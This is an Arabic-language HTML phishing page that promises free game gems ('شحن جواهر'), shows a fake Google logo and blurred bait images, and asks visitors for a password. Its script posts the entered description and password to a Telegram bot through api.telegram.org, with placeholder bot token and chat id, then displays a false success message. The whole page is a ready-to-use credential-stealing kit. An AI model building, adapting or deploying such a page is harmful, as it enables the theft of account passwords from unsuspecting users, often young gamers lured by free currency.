
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <title>شحن جواهر</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: url('photo.gif') no-repeat center center fixed;
      background-size: cover;
    }

    .header {
      background: url('photo.gif') no-repeat center center;
      background-size: cover;
      height: 200px;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .title {
      font-size: 28px;
      color: red;
      font-weight: bold;
      animation: pulse 2s infinite, glow 2s ease-in-out infinite alternate;
      margin: 20px;
      text-align: center;
    }

    @keyframes pulse {
      0% { transform: scale(1); }
      50% { transform: scale(1.05); }
      100% { transform: scale(1); }
    }

    @keyframes glow {
      from {
        text-shadow: 0 0 5px red, 0 0 10px red;
      }
      to {
        text-shadow: 0 0 20px red, 0 0 30px red;
      }
    }

    .boxes {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 15px;
      padding: 20px;
      justify-items: center;
    }

    .box {
      width: 200px;
      height: 200px;
      background: url('photo.png') center center;
      background-size: cover;
      filter: blur(3px);
      border-radius: 15px;
    }

    .form-container {
      background: white;
      width: 300px;
      margin: 30px auto;
      padding: 20px;
      border-radius: 15px;
      box-shadow: 0 0 15px rgba(0,0,0,0.2);
      position: relative;
    }

    .google-logo {
      width: 40px;
      position: absolute;
      top: -20px;
      left: 10px;
    }

    input, button {
      width: 100%;
      padding: 10px;
      margin-top: 10px;
      font-size: 16px;
      border-radius: 8px;
      border: 1px solid #ccc;
    }

    button {
      background-color: #4285f4;
      color: white;
      cursor: pointer;
      transition: 0.3s;
    }

    button:hover {
      background-color: #3367d6;
    }
  </style>
</head>
<body>

  <div class="header"></div>

  <div class="title">شحن جواهر</div>

  <div class="boxes">
    <div class="box"></div>
    <div class="box"></div>
    <div class="box"></div>
    <div class="box"></div>
    <div class="box"></div>
  </div>

  <div class="form-container">
    <img class="google-logo" src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" alt="Google Logo">
    <input type="text" id="desc" placeholder="اكتب وصفًا">
    <input type="password" id="pass" placeholder="كلمة السر">
    <button onclick="sendToBot()">إرسال</button>
  </div>

  <script>
    async function sendToBot() {
      const token = "توكن_البوت";
      const chat_id = "ايدى_التليجرام";
      const description = document.getElementById("desc").value;
      const password = document.getElementById("pass").value;

      const message = `📥 وصف: ${description}\n🔑 كلمة السر: ${password}`;

      const url = `https://api.telegram.org/bot${token}/sendMessage`;
      await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id, text: message })
      });
      alert("تم الإرسال بنجاح ✅");
    }
  </script>

</body>
</html>
